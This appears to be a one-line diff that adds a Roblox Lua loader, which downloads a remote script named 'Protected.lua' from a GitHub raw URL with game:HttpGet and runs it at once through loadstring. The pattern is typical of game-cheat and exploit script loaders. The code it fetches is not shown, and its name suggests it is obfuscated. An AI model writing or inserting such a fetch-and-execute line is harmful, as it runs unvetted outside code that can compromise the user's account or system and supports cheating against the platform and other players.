@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmokingThatWarfarePack/Smoking-That-Pack/main/Protected.lua"))()
